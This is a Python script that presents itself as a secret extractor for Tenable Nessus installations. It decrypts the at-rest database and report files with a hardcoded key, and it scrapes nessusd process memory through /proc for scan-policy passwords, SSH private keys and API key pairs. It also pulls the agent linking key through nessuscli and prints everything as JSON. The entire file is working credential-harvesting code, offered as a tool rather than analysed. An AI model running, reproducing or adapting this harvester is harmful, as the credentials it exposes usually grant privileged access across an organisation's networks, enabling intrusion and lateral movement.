#!/usr/bin/env python3
"""nessus_dump.py - Tenable Nessus secret extractor (CLI).

Usage: python3 nessus_dump.py [/opt/nessus] [mem_limit_mb]

Output shape: inventory of key material, policy
credentials + SSH keys from nessusd process memory (plaintext in the heap
regardless of at-rest DB encryption), agent linking key and signature-check
status via nessuscli. Root required for the memory scan.
"""

import glob
import hashlib
import json
import os
import re
import subprocess
import sys

BASE = sys.argv[1] if len(sys.argv) > 1 else '/opt/nessus'
LIMIT = int(sys.argv[2]) * 1024 * 1024 if len(sys.argv) > 2 else 4096 * 1024 * 1024
REGION_CAP = 512 * 1024 * 1024

FILES = {
    'master.key':       'var/nessus/master.key',
    'global.db':        'var/nessus/global.db',
    'global.db-wal':    'var/nessus/global.db-wal',
    'global.db-shm':    'var/nessus/global.db-shm',
    'cakey.pem':        'var/nessus/CA/cakey.pem',
    'serverkey.pem':    'var/nessus/CA/serverkey.pem',
    'cacert.pem':       'com/nessus/CA/cacert.pem',
    'servercert.pem':   'com/nessus/CA/servercert.pem',
    'nessus.version':   'var/nessus/nessus.version',
    'plugin_feed_info': 'lib/nessus/plugins/plugin_feed_info.inc',
}

CRED_RE = re.compile(
    rb'"(?P<svc>[A-Za-z]+)"\s*:\s*\[\{(?P<body>.{0,600}?"auth_method"\s*:\s*"'
    rb'(?P<auth>[^"]+)".{0,600}?"username"\s*:\s*"(?P<user>[^"]*)".{0,600}?'
    rb'"password"\s*:\s*"(?P<pw>[^"]*)"(.{0,300}?"domain"\s*:\s*"(?P<dom>[^"]*)")?)',
    re.S)
KEY_RE = re.compile(
    rb'"private_key_contents"\s*:\s*"(-----BEGIN[^"]+?-----END [A-Z ]*PRIVATE KEY-----)"',
    re.S)
# API keys appear in memory as a serialized pair (the at-rest storage keeps
# only accessKey + hash+salt of secretKey, so memory is the sole source of
# the plaintext secret)
APIKEY_RE = [
    re.compile(rb'"secretKey"\s*:\s*"(?P<sec>[0-9a-f]{64})"\s*,\s*"accessKey"\s*:\s*"(?P<acc>[0-9a-f]{64})"'),
    re.compile(rb'"accessKey"\s*:\s*"(?P<acc>[0-9a-f]{64})"\s*,\s*"secretKey"\s*:\s*"(?P<sec>[0-9a-f]{64})"'),
]
# the UserApiKeys row as stored in global.db (decrypted page cache lingers in
# nessusd memory long after the plaintext pair ages out): accessKey plaintext,
# secretKey only as MD5(salt+secret)
APIKEY_STORED_RE = re.compile(
    rb'\{"hash":"(?P<hash>[0-9a-f]{32})","accessKey":"(?P<acc>[0-9a-f]{64})","salt":"(?P<salt>[0-9a-f]{64})"\}')

# ---- offline at-rest decryption (validated vs live nessuscli) ----------
# master.key blocks: AES-128-OFB(K_HARDCODED[:16]); plaintext = SQLite
# PASSWD(id,passwd) -> install secret; K_file = RC4(secret)[0::8][:32];
# data files: same block framing, OFB(K_file[:16]) over [0:1012] per
# 1024-byte block, tweak = u32le(block)||tail12, block-1 marker plain.
K_HARDCODED = bytes.fromhex(
    '7b815a686e0a7c1c567b72f1d413796c6ef1fd4846c947ab886aacdf5f604695')

import base64


def _aes128_ofb_xor(key16, tweak16, data):
    # ctypes into the Nessus-shipped libcrypto (no cryptography lib, no
    # openssl-CLI forks); verified byte-identical to the reference
    import ctypes as _ct
    global _LIBCRYPTO, _OFB_CIPHER
    try:
        _LIBCRYPTO
    except NameError:
        _LIBCRYPTO = None
        for cand in (os.path.join(BASE, 'lib/nessus/libcrypto.so.3'),
                     'libcrypto.so.3'):
            try:
                _LIBCRYPTO = _ct.CDLL(cand)
                break
            except OSError:
                continue
        if _LIBCRYPTO is None:
            raise ImportError('no libcrypto')
        _LIBCRYPTO.EVP_aes_128_ofb.restype = _ct.c_void_p
        _LIBCRYPTO.EVP_CIPHER_CTX_new.restype = _ct.c_void_p
        _LIBCRYPTO.EVP_CIPHER_CTX_free.argtypes = [_ct.c_void_p]
        _LIBCRYPTO.EVP_CipherInit_ex.argtypes = [
            _ct.c_void_p, _ct.c_void_p, _ct.c_void_p,
            _ct.c_char_p, _ct.c_char_p, _ct.c_int]
        _LIBCRYPTO.EVP_CipherUpdate.argtypes = [
            _ct.c_void_p, _ct.c_char_p, _ct.POINTER(_ct.c_int),
            _ct.c_char_p, _ct.c_int]
        _OFB_CIPHER = _ct.c_void_p(_LIBCRYPTO.EVP_aes_128_ofb())
    ctx = _LIBCRYPTO.EVP_CIPHER_CTX_new()
    out = _ct.create_string_buffer(len(data) + 32)
    outl = _ct.c_int(0)
    _LIBCRYPTO.EVP_CipherInit_ex(ctx, _OFB_CIPHER, None, key16, tweak16, 1)
    _LIBCRYPTO.EVP_CipherUpdate(ctx, out, _ct.byref(outl), data, len(data))
    res = out.raw[:outl.value]
    _LIBCRYPTO.EVP_CIPHER_CTX_free(ctx)
    return res


def _decrypt_blocks(key16, data):
    parts = []
    for i in range(len(data) // 1024):
        b = i * 1024
        tweak = (i + 1).to_bytes(4, 'little') + data[b + 1012:b + 1024]
        pt = bytearray(_aes128_ofb_xor(key16, tweak, data[b:b + 1012]))
        if i == 0:
            pt[16:24] = data[b + 16:b + 24]
        parts.append(bytes(pt))
        parts.append(data[b + 1012:b + 1024])
    return b''.join(parts)


def _rc4_ks(key, n=256):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xff
        S[i], S[j] = S[j], S[i]
    out = bytearray()
    i = j = 0
    for _ in range(n):
        i = (i + 1) & 0xff
        j = (j + S[i]) & 0xff
        S[i], S[j] = S[j], S[i]
        out.append(S[(S[i] + S[j]) & 0xff])
    return bytes(out)


def db_harvest(base):
    """Decrypt master.key -> global.db(+wal) on the box and regex the same
    secret shapes the memory lane finds. Returns {} on any failure."""
    import glob as _glob
    res = {}
    try:
        mk = open(os.path.join(base, 'var/nessus/master.key'), 'rb').read()
        mk_pt = _decrypt_blocks(K_HARDCODED[:16], mk)
        if mk_pt[:15] != b'SQLite format 3':
            return res
        import sqlite3 as _sq, tempfile as _tf
        with _tf.NamedTemporaryFile(suffix='.sqlite', delete=False) as f:
            f.write(mk_pt)
            t = f.name
        secret = _sq.connect(t).execute('select passwd from PASSWD').fetchone()[0]
        res['passwd_secret'] = secret
        k16 = _rc4_ks(secret.encode())[0::8][:16]
        res['db_file_key'] = k16.hex()

        # global.db -> real temp file (+ decrypted WAL beside it so sqlite
        # replays the newest rows on open)
        tdir = _tf.mkdtemp()
        gpath = None
        gd = os.path.join(base, 'var/nessus/global.db')
        if os.path.exists(gd):
            gpath = os.path.join(tdir, 'global.db')
            open(gpath, 'wb').write(_decrypt_blocks(k16, open(gd, 'rb').read()))
        wal = os.path.join(base, 'var/nessus/global.db-wal')
        if gpath and os.path.exists(wal):
            w = open(wal, 'rb').read()
            frames = []
            off = 32
            while off + 24 + 1024 <= len(w):
                pgno = int.from_bytes(w[off:off + 4], 'big')
                blk = w[off + 24:off + 24 + 1024]
                tweak = pgno.to_bytes(4, 'little') + blk[1012:1024]
                frames.append(w[off:off + 24] + _aes128_ofb_xor(k16, tweak, blk[0:1012]) + blk[1012:1024])
                off += 24 + 1024
            if frames:
                open(gpath + '-wal', 'wb').write(w[:32] + b''.join(frames))

        # policy credentials: Credentials(type) x CredentialsData(name,value)
        # x Policies(name) - the passwords every credentialed scan runs with
        if gpath:
            try:
                con = _sq.connect(gpath)
                rows = con.execute('''
                    select p.name, c.type,
                      max(case when cd.name = 'username' then cd.value end),
                      max(case when cd.name = 'password' then cd.value end),
                      max(case when cd.name = 'auth_method' then cd.value end),
                      max(case when cd.name = 'domain' then cd.value end),
                      max(case when cd.name = 'private_key_contents' then cd.value end),
                      max(cd.credentials_id)
                    from CredentialsData cd
                    join Credentials c on c.object_id = cd.credentials_id
                    left join PolicyCredentials pc on pc.credentials_id = c.object_id
                    left join Policies p on p.object_id = pc.policy_id
                    group by cd.credentials_id''').fetchall()
                con.close()
                creds = {}
                for pol, ctype, user, pw, auth, dom, key, cid in rows:
                    if not user and not pw and not key:
                        continue
                    k = '%s|%s|%s' % (ctype or '?', user or '', pw or '')
                    creds[k] = {
                        'service': ctype or 'unknown',
                        'auth_method': (auth or 'password') if not key else 'key',
                        'username': user or '',
                        'password': pw or '',
                        'domain': dom or '',
                        'ssh_key': key or '',
                        'pid': 'db'}
                res['creds'] = list(creds.values())
                res['policies_decrypted'] = len({r[0] for r in rows if r[0]})
            except Exception as e:
                res['db_cred_error'] = str(e)

        # on-disk .nessus report files use the same envelope - decrypt
        # each and merge into the same harvest buckets
        for rep in _glob.glob(os.path.join(base, 'var/nessus/users/*/reports/*')):
            if rep.endswith(('.name', '.ts')) or os.path.isdir(rep):
                continue
            try:
                raw = open(rep, 'rb').read()
                if raw[16:18] != b'\x04\x00':
                    continue
                rblob = _decrypt_blocks(k16, raw)
                if rblob[:15] != b'SQLite format 3':
                    continue
                res.setdefault('reports_decrypted', []).append(rep)
                # keep the decrypted report as a browsable sqlite and emit
                # the .nessus XML export beside it (outdir/ in the report)
                rdb = os.path.join(tdir, os.path.basename(rep) + '.sqlite')
                open(rdb, 'wb').write(rblob)
                xml = _export_report_xml(rdb, os.path.basename(rep))
                if xml:
                    res.setdefault('report_xml', []).append(
                        {'path': xml, 'report': rep})
                for m in APIKEY_STORED_RE.finditer(rblob):
                    acc = m.group('acc').decode()
                    res['api_keys_stored'].setdefault(acc, {
                        'access_key': acc,
                        'hash': m.group('hash').decode(),
                        'salt': m.group('salt').decode(),
                        'pid': 'report'})
            except Exception:
                continue

        blob = b''
        if gpath and os.path.exists(gpath):
            blob += open(gpath, 'rb').read()
        if gpath and os.path.exists(gpath + '-wal'):
            blob += open(gpath + '-wal', 'rb').read()[32:]
        if not blob:
            return res

        res['api_keys_stored'] = {}
        for m in APIKEY_STORED_RE.finditer(blob):
            acc = m.group('acc').decode()
            res['api_keys_stored'][acc] = {
                'access_key': acc,
                'hash': m.group('hash').decode(),
                'salt': m.group('salt').decode(),
                'pid': 'db'}
    except Exception as e:
        res['db_decrypt_error'] = str(e)
    return res


def _xml_escape(v):
    return (str(v).replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            .replace('"', '&quot;'))


def _export_report_xml(sqlite_path, report_name):
    """Rebuild the NessusClientData_v2 XML the export API serves, from a
    decrypted report database (verified semantically against a live export).
    Returns the XML path (written next to the sqlite) or None."""
    from xml.sax.saxutils import quoteattr
    import sqlite3 as sq
    try:
        con = sq.connect('file:%s?mode=ro' % sqlite_path, uri=True)
    except Exception:
        return None
    out = ['<?xml version="1.0" encoding="UTF-8"?>', '<NessusClientData_v2>']
    out.append('<Policy><policyName>Scan Policy</policyName>')
    out.append('<Preferences><ServerPreferences>')
    try:
        for key, value in con.execute('select key, value from SETTINGS order by id'):
            out.append('<preference><name>%s</name>\n<value>%s</value>\n</preference>'
                       % (_xml_escape(key), _xml_escape(value if value is not None else '')))
    except Exception:
        pass
    out.append('</ServerPreferences><PluginsPreferences></PluginsPreferences>')
    out.append('<FamilySelection></FamilySelection>')
    out.append('<IndividualPluginSelection></IndividualPluginSelection>')
    out.append('</Preferences></Policy>')
    out.append('<Report name=%s xmlns:cm="http://www.nessus.org/cm">' % quoteattr(report_name))
    n_items = 0
    try:
        hosts = con.execute('select id, hostname, host_ip, host_fqdn from Host order by id').fetchall()
        for host_id, hostname, host_ip, host_fqdn in hosts:
            name = hostname or host_ip or ('host-%d' % host_id)
            out.append('<ReportHost name=%s><HostProperties>' % quoteattr(name))
            if host_ip:
                out.append('<tag name="host-ip">%s</tag>' % _xml_escape(host_ip))
            if host_fqdn:
                out.append('<tag name="host-fqdn">%s</tag>' % _xml_escape(host_fqdn))
            for tag_name, tag_value in con.execute(
                    'select tn.tag_name, tv.tag_value from HostTags ht '
                    'join TagNames tn on tn.id = ht.tag_name_id '
                    'join TagValues tv on tv.id = ht.tag_value_id '
                    'where ht.host_id = ?', (host_id,)):
                out.append('<tag name=%s>%s</tag>'
                           % (quoteattr(tag_name), _xml_escape(tag_value)))
            out.append('</HostProperties>')
            for (port_id, port, protocol, svc) in con.execute(
                    'select id, port, protocol, svc_name from Ports '
                    'where host_id = ? order by port', (host_id,)):
                svc_row = con.execute('select svc_name from SvcNames where id = ?', (svc,)).fetchone()
                svc_name = svc_row[0] if svc_row else 'general'
                for res_id, plugin_id, severity, plugin_output in con.execute(
                        'select sr.id, sr.plugin_id, sr.severity, po.plugin_output '
                        'from ScanResults sr left join PluginOutput po on po.id = sr.output_id '
                        'where sr.host_id = ? and sr.port_id = ? order by sr.plugin_id',
                        (host_id, port_id)):
                    plugin = con.execute(
                        'select p.plugin_name, f.plugin_family from Plugins p '
                        'left join PluginFamilies f on f.id = p.plugin_family_id '
                        'where p.id = ?', (plugin_id,)).fetchone()
                    plugin_name = plugin[0] if plugin else ('plugin-%d' % plugin_id)
                    family = plugin[1] if plugin and plugin[1] else 'General'
                    out.append('<ReportItem port="%d" svc_name=%s protocol=%s severity="%s" '
                               'pluginID="%s" pluginName=%s pluginFamily=%s>'
                               % (port or 0, quoteattr(svc_name), quoteattr(protocol or 'tcp'),
                                  severity if severity is not None else 0, plugin_id,
                                  quoteattr(plugin_name), quoteattr(family)))
                    for attr_name, attr_value in con.execute(
                            'select an.attribute_name, av.attribute_value from PluginAttributes pa '
                            'join PluginAttributesNames an on an.id = pa.attribute_name_id '
                            'join PluginAttributesValues av on av.id = pa.attribute_value_id '
                            'where pa.plugin_id = ?', (plugin_id,)):
                        out.append('<%s>%s</%s>' % (_xml_escape(attr_name),
                                                     _xml_escape(attr_value),
                                                     _xml_escape(attr_name)))
                    if plugin_output:
                        out.append('<plugin_output>%s</plugin_output>' % _xml_escape(plugin_output))
                    out.append('</ReportItem>')
                    n_items += 1
            out.append('</ReportHost>')
        out.append('</Report></NessusClientData_v2>')
    except Exception:
        con.close()
        return None
    con.close()
    xml_path = sqlite_path[:-7] + '.nessus'
    open(xml_path, 'w', encoding='utf-8').write('\n'.join(out) + '\n')
    return xml_path if n_items or hosts else xml_path


def inventory():
    out = {}
    for fid, rel in FILES.items():
        path = os.path.join(BASE, rel)
        out[fid] = {
            'path': path,
            'size': os.path.getsize(path) if os.path.isfile(path) else None,
            'readable': os.access(path, os.R_OK),
        }
    for h in glob.glob(os.path.join(BASE, 'var/nessus/users/*/auth/hash')):
        out['user:' + os.path.basename(os.path.dirname(os.path.dirname(h)))] = {
            'path': h, 'size': os.path.getsize(h), 'readable': os.access(h, os.R_OK)}
    return out


def meta():
    m = {}
    try:
        m['version'] = open(os.path.join(BASE, 'var/nessus/nessus.version')).read().strip()
    except OSError:
        pass
    try:
        f = open(os.path.join(BASE, 'lib/nessus/plugins/plugin_feed_info.inc')).read()
        mm = re.search(r'PLUGIN_SET\s*=\s*"([^"]+)"', f)
        if mm:
            m['plugin_set'] = mm.group(1)
    except OSError:
        pass
    return m


def nessusd_pids():
    pids = []
    for comm in glob.glob('/proc/[0-9]*/comm'):
        try:
            if open(comm).read().strip() == 'nessusd':
                pids.append(comm.split('/')[2])
        except OSError:
            continue
    return pids


def scan_pid(pid, report):
    try:
        maps = open('/proc/%s/maps' % pid).read().splitlines()
        mem = open('/proc/%s/mem' % pid, 'rb', 0)
    except OSError as e:
        report['errors'].append('cannot open /proc/%s/* (%s)' % (pid, e))
        return
    total = 0
    for line in maps:
        m = re.match(r'^([0-9a-f]+)-([0-9a-f]+) (r..[ps])(?:\s+\S+\s+\S+\s+\S+\s+(.*))?$',
                     line)
        if not m:
            continue
        # credentials survive in anonymous arenas - including read-only ones
        # (jemalloc degrades freed extents to r--p) - but not in the
        # file-backed databases/shared objects
        path = m.group(4)
        if path and ('.so' in path or path.startswith('/opt/nessus')):
            continue
        start, end = int(m.group(1), 16), int(m.group(2), 16)
        if end - start > REGION_CAP:
            continue
        if total + (end - start) > LIMIT:
            break
        length = end - start
        try:
            mem.seek(start)
            data = mem.read(length)
        except OSError:
            continue
        total += len(data)
        for x in CRED_RE.finditer(data):
            key = (x.group('svc') + b'|' + x.group('user') + b'|' + x.group('pw')).decode(
                'utf-8', 'replace')
            report['creds'][key] = {
                'service': x.group('svc').decode('utf-8', 'replace'),
                'auth_method': x.group('auth').decode('utf-8', 'replace'),
                'username': x.group('user').decode('utf-8', 'replace'),
                'password': x.group('pw').decode('utf-8', 'replace'),
                'domain': (x.group('dom') or b'').decode('utf-8', 'replace'),
                'pid': pid,
            }
        for x in KEY_RE.finditer(data):
            pem = x.group(1).decode('utf-8', 'replace').replace('\\n', '\n').replace('\\"', '"')
            report['ssh_keys'][hashlib.sha256(pem.encode()).hexdigest()] = pem
        for api_re in APIKEY_RE:
            for x in api_re.finditer(data):
                acc = x.group('acc').decode()
                report['api_keys'][acc] = {
                    'access_key': acc,
                    'secret_key': x.group('sec').decode(),
                }
        for x in APIKEY_STORED_RE.finditer(data):
            acc = x.group('acc').decode()
            if acc not in report['api_keys']:
                report['api_keys_stored'][acc] = {
                    'access_key': acc,
                    'hash': x.group('hash').decode(),
                    'salt': x.group('salt').decode(),
                }
    mem.close()
    report['scanned_bytes'][pid] = total


def nessuscli(args):
    cli = os.path.join(BASE, 'sbin/nessuscli')
    if not os.access(cli, os.X_OK):
        return None
    env = dict(os.environ, HOME='/root')
    try:
        out = subprocess.run([cli] + args.split(), capture_output=True, timeout=120,
                             env=env).stdout.decode('utf-8', 'replace')
        return out
    except Exception:
        return None


report = {
    'base': BASE,
    'meta': meta(),
    'db': db_harvest(BASE),
    'files': inventory(),
    'creds': {},
    'ssh_keys': {},
    'api_keys': {},
    'api_keys_stored': {},
    'scanned_bytes': {},
    'errors': [],
}

for pid in nessusd_pids():
    scan_pid(pid, report)

lk = nessuscli('fix --secure --get agent_linking_key')
if lk:
    m = re.search(r"'([0-9a-f]{64})'", lk)
    if m:
        report['agent_linking_key'] = m.group(1)
sc = nessuscli('fix --get nasl_no_signature_check')
if sc:
    m = re.search(r"is '([^']+)'", sc)
    if m:
        report['nasl_no_signature_check'] = m.group(1)

report['creds'] = list(report['creds'].values())
report['ssh_keys'] = list(report['ssh_keys'].values())
report['api_keys'] = list(report['api_keys'].values())
report['api_keys_stored'] = list(report['api_keys_stored'].values())
print(json.dumps(report, indent=1))
